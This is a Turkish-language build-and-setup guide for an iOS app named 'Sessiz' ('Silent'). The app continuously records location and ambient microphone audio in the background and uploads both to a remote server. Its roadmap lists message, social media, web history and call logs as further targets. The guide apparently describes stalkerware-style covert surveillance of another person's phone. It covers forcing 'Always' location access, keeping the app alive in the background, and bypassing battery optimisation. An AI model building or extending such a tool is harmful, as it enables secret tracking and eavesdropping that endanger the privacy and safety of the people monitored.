# Kurulum ve Kullanım Kılavuzu

## Adım 1: iOS Uygulamasını Hazırlama

### Xcode'da Proje Oluşturma

1. Xcode'u açın
2. File > New > Project
3. iOS > App seçin
4. Product Name: `Sessiz`
5. Interface: Storyboard (veya SwiftUI)
6. Language: Swift
7. Bundle Identifier'ı benzersiz bir değer yapın (örn: `com.yourcompany.sessiz`)

### Dosyaları Ekleme

1. Bu klasördeki tüm `.swift` dosyalarını Xcode projenize ekleyin
2. `Info.plist` dosyasını projenize ekleyin ve mevcut `Info.plist` ile birleştirin
3. Proje ayarlarında `Info.plist File` yolunu kontrol edin

### Önemli Ayarlar

**Signing & Capabilities:**
- Background Modes'u etkinleştirin:
  - ✅ Location updates
  - ✅ Audio, AirPlay, and Picture in Picture
  - ✅ Background processing

**Info.plist Kontrolü:**
- Tüm izin açıklamalarının (`NSLocationAlwaysUsageDescription`, `NSMicrophoneUsageDescription`) eklendiğinden emin olun

## Adım 2: Sunucu Kurulumu

### Python Sunucusu (Örnek)

```bash
# Gerekli paketleri yükleyin
pip install -r requirements.txt

# Sunucuyu başlatın
python server_example.py
```

Sunucu `http://localhost:5000` adresinde çalışacaktır.

### Sunucu URL'ini Ayarlama

`DataUploader.swift` dosyasında:

```swift
private let serverURL = "https://your-server.com/api/upload"
```

Değerini kendi sunucu URL'inizle değiştirin.

**Not:** Gerçek kullanımda:
- HTTPS kullanın
- Authentication ekleyin
- Verileri şifreleyin
- Veritabanı kullanın (JSON dosyaları yerine)

## Adım 3: Uygulamayı Test Etme

### Simülatörde Test

1. Xcode'da bir simülatör seçin
2. Run (⌘R) ile çalıştırın
3. İzinleri verin (konum ve mikrofon)

### Gerçek Cihazda Test

1. Cihazınızı Mac'e bağlayın
2. Xcode'da cihazınızı seçin
3. Signing & Capabilities'de Apple Developer hesabınızı seçin
4. Run ile yükleyin

**Önemli:** Gerçek cihazda test etmek önemlidir çünkü:
- Simülatörde konum takibi sınırlıdır
- Arka plan davranışları farklıdır

## Adım 4: İzinleri Verme

Uygulama ilk açıldığında:

1. **Konum İzni:**
   - "Her Zaman İzin Ver" seçeneğini seçin
   - Ayarlar > Gizlilik > Konum Servisleri'nden kontrol edin

2. **Mikrofon İzni:**
   - "İzin Ver" seçeneğini seçin
   - Ayarlar > Gizlilik > Mikrofon'dan kontrol edin

## Adım 5: Arka Plan Çalışması

### iOS Ayarları

1. Ayarlar > Genel > Arka Plan Uygulama Yenileme
2. Sessiz uygulamasını açık konuma getirin

### Pil Optimizasyonu

iOS, pil tasarrufu için uygulamaları kısıtlayabilir:
- Ayarlar > Pil > Pil Optimizasyonu
- Sessiz uygulamasını "Optimize Etme" listesine ekleyin

## Sorun Giderme

### Konum Takibi Çalışmıyor

**Kontrol Listesi:**
- [ ] Info.plist'te `NSLocationAlwaysAndWhenInUseUsageDescription` var mı?
- [ ] Ayarlar'da "Her Zaman" izni verilmiş mi?
- [ ] Background Modes'da "Location updates" aktif mi?
- [ ] Cihazda Konum Servisleri açık mı?

**Çözüm:**
```swift
// LocationManager.swift'te izin durumunu kontrol edin
let status = locationManager.authorizationStatus
print("Konum izni durumu: \(status)")
```

### Ses Kaydı Çalışmıyor

**Kontrol Listesi:**
- [ ] Info.plist'te `NSMicrophoneUsageDescription` var mı?
- [ ] Mikrofon izni verilmiş mi?
- [ ] Background Modes'da "Audio" aktif mi?
- [ ] Ses oturumu doğru yapılandırılmış mı?

**Çözüm:**
```swift
// AudioRecorder.swift'te izin durumunu kontrol edin
let status = AVAudioSession.sharedInstance().recordPermission
print("Mikrofon izni durumu: \(status)")
```

### Veriler Sunucuya Yüklenmiyor

**Kontrol Listesi:**
- [ ] İnternet bağlantısı var mı?
- [ ] Sunucu URL'i doğru mu?
- [ ] Sunucu çalışıyor mu?
- [ ] Firewall/antivirus engelliyor mu?

**Çözüm:**
- `DataUploader.swift`'te hata loglarını kontrol edin
- `pending_uploads.json` dosyasını kontrol edin (veriler yerel olarak saklanır)

## Güvenlik Notları

### Önemli Uyarılar

1. **Şifreleme:** Hassas verileri şifreleyin
2. **Authentication:** Sunucuya erişimi kimlik doğrulama ile koruyun
3. **HTTPS:** Mutlaka HTTPS kullanın
4. **Veri Saklama:** Verileri güvenli bir şekilde saklayın
5. **Yasal Uyum:** Yerel yasalara uygun olun

### Önerilen İyileştirmeler

1. **Token-based Authentication:**
```swift
request.setValue("Bearer YOUR_TOKEN", forHTTPHeaderField: "Authorization")
```

2. **Veri Şifreleme:**
```swift
// AES şifreleme kullanın
import CryptoKit
```

3. **Veritabanı:**
- PostgreSQL, MySQL veya MongoDB kullanın
- JSON dosyaları yerine

4. **Monitoring:**
- Sunucu loglarını izleyin
- Anomali tespiti ekleyin

## Sonraki Adımlar

1. ✅ Konum takibi - Tamamlandı
2. ✅ Ortam dinleme - Tamamlandı
3. ⏭️ Mesaj kayıtları (iOS sınırlamaları nedeniyle sınırlı)
4. ⏭️ Sosyal medya kayıtları (iOS sınırlamaları nedeniyle sınırlı)
5. ⏭️ Web arama geçmişi (iOS sınırlamaları nedeniyle sınırlı)
6. ⏭️ Çağrı kayıtları (iOS sınırlamaları nedeniyle sınırlı)

**Not:** iOS'un güvenlik politikaları nedeniyle bazı özellikler mümkün değildir veya çok sınırlıdır.

